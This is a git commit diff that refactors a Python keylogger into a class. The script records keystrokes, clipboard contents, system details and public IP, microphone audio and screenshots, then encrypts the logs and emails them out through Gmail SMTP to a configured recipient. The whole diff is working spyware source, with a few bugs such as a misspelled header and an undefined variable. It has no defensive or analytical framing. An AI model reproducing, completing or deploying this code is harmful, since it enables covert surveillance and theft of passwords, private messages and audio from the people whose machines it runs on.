19e24f5ce45ace19028b24da99f73c8bd024378b
JoelOdhiambo <wesleyjoel4@gmail.com>
2022-03-28 15:03:17 +0300

    Start of OOP Implementation

--- KeyLogger.py
+++ KeyLogger.py
@@ -28,6 +28,11 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+# File path of Key log file
+file_path = "D:\Docs\Computing Fundamentals\Python Work\Cybersecurity Projects\Keylogger"
+# Important to access Key log file
+extend = "\\"
+file_merge = file_path + extend
 email_address = ""  # Insert email address that sends files
 password = ""  # Insert email password
 email_to = ""  # Insert email address that receives files
@@ -45,11 +50,6 @@ encrypted_system_info = "systeminfo_encrypted.txt"
 encrypted_clipboard_info = "clipboard_encrypted.txt"
 
 microphone_time = 10
-# File path of Key log file
-file_path = "D:\Docs\Computing Fundamentals\Python Work\Cybersecurity Projects\Keylogger"
-# Important to access Key log file
-extend = "\\"
-file_merge = file_path + extend
 
 counter = 0
 # List for storing keys
@@ -60,151 +60,148 @@ time_iteration = 15
 current_time = time.time()
 stopping_time = time.time() + time_iteration
 
-
-# Get Clipboard information
-def copy_clipboard():
-    with open(file_path + extend + clipboard_info, 'a') as f:
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            f.write("Clipboard Data: \n" + pasted_data)
-        except:
-            f.write("Clipboard cannot be copied")
+class KeyLogger:
 
 
-def on_press(key):
-    global keys, counter
-    print(key)
-    keys.append(key)
-    counter += 1
-
-    if counter >= 1:
-        counter = 0
-        write_to_file(keys)
-        keys = []
-
-
-def write_to_file(keys):
-    # Open file and append keys pressed
-    with open(file_path + extend + key_info, "a") as f:
-        for key in keys:
-            r = str(key).replace("'", "")
-            if r.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif r.find("Key") == -1:
-                f.write(r)
-                f.close()
+    # Get Clipboard information
+    def copy_clipboard(self):
+        with open(file_path + extend + clipboard_info, 'a') as f:
+            try:
+                win32clipboard.OpenClipboard()
+                pasted_data = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                f.write("Clipboard Data: \n" + pasted_data)
+            except:
+                f.write("Clipboard cannot be copied")
 
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+    def on_press(self,key):
+        global keys, counter
+        print(key)
+        keys.append(key)
+        counter += 1
+
+        if counter >= 1:
+            counter = 0
+            self.write_to_file(keys)
+            keys = []
 
 
-# with Listener(on_press=on_press, on_release=on_release) as listener:
-#     listener.join()
+    def write_to_file(self,keys):
+        # Open file and append keys pressed
+        with open(file_path + extend + key_info, "a") as f:
+            for key in keys:
+                r = str(key).replace("'", "")
+                if r.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif r.find("Key") == -1:
+                    f.write(r)
+                    f.close()
 
 
-# Email Functionality - send keys to email
-
-def send_email(file_name, attachment, email_to):
-    email_from = email_address
-
-    msg = MIMEMultipart()  # for attachments
-
-    msg['From'] = email_from
-    msg['To'] = email_to
-    msg['Subject'] = "Important Log"
-
-    body = "Logs_so_far"  # email body
-    msg.attach(MIMEText(body, 'plain'))
-
-    file_name = file_name
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Contet-Disposition', "attachment; filename=%s" % filename)
-    msg.attach(p)
-
-    smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
-
-    smtp_session.starttls()
-
-    smtp_session.login(email_from, password)
-
-    text = msg.as_string()
-
-    smtp_session.sendmail(email_from, email_to, text)
+    def on_release(self,key):
+        if key == Key.esc:
+            return False
 
 
+    # with Listener(on_press=on_press, on_release=on_release) as listener:
+    #     listener.join()
+
+
+    # Email Functionality - send keys to email
+
+    def send_email(self,file_name, attachment, email_to):
+        email_from = email_address
+
+        msg = MIMEMultipart()  # for attachments
+
+        msg['From'] = email_from
+        msg['To'] = email_to
+        msg['Subject'] = "Important Log"
+
+        body = "Logs_so_far"  # email body
+        msg.attach(MIMEText(body, 'plain'))
+
+        file_name = file_name
+        attachment = open(attachment, 'rb')
+
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload((attachment).read())
+
+        encoders.encode_base64(p)
+
+        p.add_header('Contet-Disposition', "attachment; filename=%s" % filename)
+        msg.attach(p)
+
+        smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
+
+        smtp_session.starttls()
+
+        smtp_session.login(email_from, password)
+
+        text = msg.as_string()
+
+        smtp_session.sendmail(email_from, email_to, text)
 
 
 
-def system_information():
-    with open(file_path + extend + system_info, "a") as f:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
-        try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
-        except Exception:
-            f.write("Failed to get public IP address!")
+    def system_information(self):
+        with open(file_path + extend + system_info, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write("Public IP Address: " + public_ip)
+            except Exception:
+                f.write("Failed to get public IP address!")
 
-        f.write("Processor: " + (platform.processor())+'\n')
-        f.write("System: " + platform.system()+" "+platform.version() + '\n')
-        f.write("Machine: " + platform.machine() + '\n')
-        f.write("Hostname: " + hostname + '\n')
-        f.write("Private IP Address: " + IPAddr + '\n')
-
-
-def microphone():
-    freq = 44100
-    rec_time = microphone_time
-    recording = sdl.rec(int(rec_time * freq), samplerate=freq, channels=2)
-    sdl.wait()
-    write(file_path + extend + audio_info, freq, recording)
+            f.write("Processor: " + (platform.processor())+'\n')
+            f.write("System: " + platform.system()+" "+platform.version() + '\n')
+            f.write("Machine: " + platform.machine() + '\n')
+            f.write("Hostname: " + hostname + '\n')
+            f.write("Private IP Address: " + IPAddr + '\n')
 
 
-def screenshot():
-    img = ImageGrab.grab()
-    img.save(file_path + extend + screen_info)
+    def microphone(self):
+        freq = 44100
+        rec_time = microphone_time
+        recording = sdl.rec(int(rec_time * freq), samplerate=freq, channels=2)
+        sdl.wait()
+        write(file_path + extend + audio_info, freq, recording)
 
 
-files_to_encrypt = [file_merge+system_info,
-                    file_merge+clipboard_info, file_merge+key_info]
-encrypted_file_names = [file_merge+encrypted_key_info, file_merge +
-                        encrypted_clipboard_info, file_merge+encrypted_system_info]
+    def screenshot(self):
+        img = ImageGrab.grab()
+        img.save(file_path + extend + screen_info)
 
-counter = 0
-for encryption in files_to_encrypt:
-    with open(files_to_encrypt[counter], 'rb') as f:
-        data = f.read()
 
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(data)
+    files_to_encrypt = [file_merge+system_info,
+                        file_merge+clipboard_info, file_merge+key_info]
+    encrypted_file_names = [file_merge+encrypted_key_info, file_merge +
+                            encrypted_clipboard_info, file_merge+encrypted_system_info]
 
-    with open(encrypted_file_names[counter], 'wb') as f:
-        f.write(encrypted)
+    counter = 0
+    for encryption in files_to_encrypt:
+        with open(files_to_encrypt[counter], 'rb') as f:
+            data = f.read()
 
-    send_email(encrypted_file_names[counter],
-               encrypted_file_names[counter], email_to)
-    counter += 1
-time.sleep(120)
+            fernet = Fernet(key)
+            encrypted = fernet.encrypt(data)
 
-def main():
-  # on_press(key)
-  # on_release(key)
-  # write_to_file(keys)
-  send_email(key_info, file_path + extend + key_info, email_to)
-  system_information()
-  microphone()
-  screenshot()
+        with open(encrypted_file_names[counter], 'wb') as f:
+            f.write(encrypted)
+
+        send_email(encrypted_file_names[counter],
+                encrypted_file_names[counter], email_to)
+        counter += 1
+    time.sleep(120)
+
+
 
 if __name__ == '__main__':
-  main()
+  logger=KeyLogger()
+  logger.send_email(key_info, file_path + extend + key_info, email_to)
+  logger.system_information()
+  logger.microphone()
+  logger.screenshot()
